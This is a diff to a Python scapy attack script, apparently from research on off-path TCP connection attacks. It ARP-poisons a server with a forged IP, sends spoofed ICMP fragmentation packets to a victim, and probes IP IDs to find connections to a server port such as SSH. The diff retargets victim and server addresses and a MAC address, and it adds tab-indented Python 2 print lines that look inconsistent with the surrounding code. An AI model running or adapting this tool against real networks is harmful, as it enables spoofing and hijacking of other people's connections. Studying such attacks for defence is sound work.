@@ -32,16 +32,17 @@ from scapy.layers.l2 import *
                     2020/3/10    Kevin.F:    Add time-counter based architecture
 """
 
-forge_ip = '10.10.4.197'                    # hash collision IP (get form collision_find.py)
-victim_ip = '10.10.100.1'                   # victim ip address
-server_ip = '10.10.100.2'                   # server ip address
+forge_ip = '192.168.6.22'                   # hash collision IP (get form collision_find.py)
+victim_ip = '192.168.66.105'                # victim ip address
+server_ip = '192.168.66.106'                # server ip address
 server_port = 22                            # known server port (e.g. ssh:22 BGP:179)
 
-server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
-my_mac_addr = get_if_hwaddr('ens33')        # mac address of attacker
+my_if_name = 'eno1'
+server_mac_addr = '44:a8:42:15:13:4d'       # mac address of server used for ARP poison
+my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
 z_payload = b''                             # full-zero byte string used for padding
 
-N_THREAD = 5                                # number of checking thread
+N_THREAD = 7                                # number of checking thread
 BLOCK = 150                                 # port block size
 sleep_time = 0.5                            # for maximum challenge-ACK rate
 
@@ -102,13 +103,12 @@ def arp_inject():
     forged_ip = forge_ip
     # here we send a UDP packet to allure server to execute ip/mac convert
     pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
-                iface='ens33', timeout=1, count=1, started_callback=
+                iface=my_if_name, timeout=1, count=1, started_callback=
                 lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
-                             iface='ens33', verbose=False))
-
+                             iface=my_if_name, verbose=False))
     if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
         send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
-             iface='ens33', verbose=False)
+             iface=my_if_name, verbose=False)
 
     time.sleep(0.5)
 
@@ -132,7 +132,7 @@ def tcp_fragment():
          IP(flags=2, src=server_ip, dst=victim_ip) /
          ICMP(type=0, code=0) /
          z_payload,
-         iface='ens33', verbose=False)
+         iface=my_if_name, verbose=False)
 
     time.sleep(0.5)
 
@@ -167,16 +167,17 @@ def check_new_list(list_p):
         send_list.append(IP(src=forge_ip, dst=server_ip) / ICMP(id=icmp_seq))
 
     while True:
-        semaphore_ipid.acquire()
+	semaphore_ipid.acquire()
         pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + forge_ip,
-                     iface='ens33', count=1 + C, timeout=2, started_callback=
-                     lambda: send(send_list, iface='ens33', verbose=False))
+                     iface=my_if_name, count=1 + C, timeout=2, started_callback=
+                     lambda: send(send_list, iface=my_if_name, verbose=False))
         semaphore_ipid.release()
-        if len(pkts) != 1 + C:
+        print len(pkts)
+	if len(pkts) != 1 + C:
             time.sleep(sleep_time)
         else:
             break
-
+    
     ipids = []
     for pk in pkts:
         ipids.append(pk[1].fields['id'])
@@ -335,3 +336,8 @@ if __name__ == '__main__':
         t.start()
         time.sleep(0.05)
         print('Num_' + str(i) + ' thread started.')
+
+    st = time.time()
+    while not stop:
+	time.sleep(0.5)
+    print time.time() - st
